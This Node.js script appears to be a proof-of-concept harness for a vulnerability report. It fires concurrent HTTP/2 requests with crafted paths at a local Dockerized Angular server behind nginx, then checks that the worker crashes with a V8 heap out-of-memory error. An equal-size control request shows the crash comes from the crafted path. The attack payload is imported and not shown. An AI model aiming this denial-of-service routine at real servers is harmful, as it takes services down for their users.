import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdirSync, writeFileSync } from 'node:fs';
import http2 from 'node:http2';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { payload } from './payload.mjs';

const root = dirname(dirname(fileURLToPath(import.meta.url)));
const heapMiB = Number(process.argv[2] ?? 256);
const targetBytes = Number(process.argv[3] ?? 16000);
const concurrency = Number(process.argv[4] ?? (heapMiB === 256 ? 10 : 20));
assert([256, 512].includes(heapMiB));
assert(targetBytes >= 1000 && targetBytes <= 16000);
assert(concurrency >= 1 && concurrency <= 128);
const label = process.argv[5] ?? '';
assert(/^[a-z0-9-]*$/.test(label), 'invalid evidence label');
const candidate = payload(targetBytes, false);
const control = payload(targetBytes, true);
assert.equal(Buffer.byteLength(candidate.path), Buffer.byteLength(control.path));

function docker(args, allowFailure = false) {
  const run = spawnSync('docker', ['compose', ...args], {
    cwd: root,
    env: { ...process.env, HEAP_MB: String(heapMiB) },
    encoding: 'utf8',
    timeout: 120000,
    maxBuffer: 1024 * 1024,
    windowsHide: true,
  });
  if (!allowFailure && run.status !== 0) {
    throw new Error(`docker compose ${args.join(' ')} failed: ${run.stderr || run.stdout}`);
  }
  return run.stdout + run.stderr;
}

function sendOne(client, path) {
  return new Promise((resolve) => {
    const start = performance.now();
    let status = null;
    let locationBytes = 0;
    let done = false;
    const finish = (extra = {}) => {
      if (done) return;
      done = true;
      resolve({ status, locationBytes, ms: Math.round(performance.now() - start), ...extra });
    };
    const stream = client.request({ ':method': 'GET', ':path': path });
    stream.on('response', (headers) => {
      status = headers[':status'];
      locationBytes = Buffer.byteLength(headers.location ?? '');
    });
    stream.on('data', () => {});
    stream.on('end', () => finish());
    stream.on('error', (error) => finish({ error: error.code ?? error.message }));
    stream.on('close', () => finish(status ? {} : { error: 'closed' }));
    stream.setTimeout(60000, () => stream.close(http2.constants.NGHTTP2_CANCEL));
    stream.end();
  });
}

async function send(path, count) {
  const client = http2.connect('http://127.0.0.1:8080');
  client.on('error', () => {});
  try {
    return await Promise.all(Array.from({ length: count }, () => sendOne(client, path)));
  } finally {
    client.destroy();
  }
}

async function stats() {
  const client = http2.connect('http://127.0.0.1:8080');
  client.on('error', () => {});
  try {
    return await new Promise((resolve) => {
      const stream = client.request({ ':method': 'GET', ':path': '/stats' });
      let body = '';
      let status = null;
      stream.on('response', (h) => { status = h[':status']; });
      stream.on('data', (chunk) => { body += chunk; });
      stream.on('end', () => {
        try { resolve(status === 200 ? JSON.parse(body) : null); }
        catch { resolve(null); }
      });
      stream.on('error', () => resolve(null));
      stream.on('close', () => resolve(null));
      stream.setTimeout(5000, () => stream.close(http2.constants.NGHTTP2_CANCEL));
      stream.end();
    });
  } finally {
    client.destroy();
  }
}

function appState() {
  const id = docker(['ps', '-a', '-q', 'app']).trim();
  if (!id) return null;
  const r = spawnSync('docker', ['inspect', id, '--format', '{{json .State}}'], {
    encoding: 'utf8', windowsHide: true,
  });
  return r.status === 0 ? JSON.parse(r.stdout) : null;
}

function fresh() {
  docker(['down', '-v', '--remove-orphans'], true);
  docker(['up', '-d', '--wait', 'app', 'nginx']);
}

const result = {
  platform: process.platform, node: process.version, angular: '22.2.2',
  heapMiB, targetBytes, concurrency,
  requestBytes: Buffer.byteLength(candidate.path), markers: candidate.markers,
};
try {
  fresh();
  result.control = { responses: await send(control.path, concurrency), stats: await stats(), state: appState() };
  fresh();
  result.single = { responses: await send(candidate.path, 1), stats: await stats(), state: appState() };
  fresh();
  result.attack = { responses: await send(candidate.path, concurrency) };
  result.attack.state = appState();
  result.attack.stats = await stats();
  result.attack.appLogTail = docker(['logs', '--no-color', 'app'], true).slice(-3500);
} finally {
  docker(['down', '-v', '--remove-orphans'], true);
}
mkdirSync(join(root, 'evidence'), { recursive: true });
const file = join(root, 'evidence', `proxy-${heapMiB}-${targetBytes}${label ? '-' + label : ''}.json`);
writeFileSync(file, JSON.stringify(result, null, 2) + '\n');
assert.equal(result.control.responses.filter((r) => r.status === 302).length, concurrency, 'control failed: ' + file);
assert.equal(result.control.stats?.redirectCalls, concurrency, 'control repeated redirects');
assert.equal(result.single.stats?.redirectCalls, 1, 'single candidate repeated redirects');
assert.match(result.attack.appLogTail, /Reached heap limit|JavaScript heap out of memory/, 'no V8 OOM: ' + file);
assert.equal(result.attack.state?.OOMKilled, false, 'container OOM kill: ' + file);
assert(result.attack.state?.ExitCode > 0, 'worker did not exit: ' + file);
console.log(`PASS proxy ${heapMiB} MiB: ${result.requestBytes} B, HTTP/2 x${concurrency} -> V8 OOM; equal-size control ${concurrency}/${concurrency} HTTP 302; Docker OOMKilled=false`);
console.log(file);
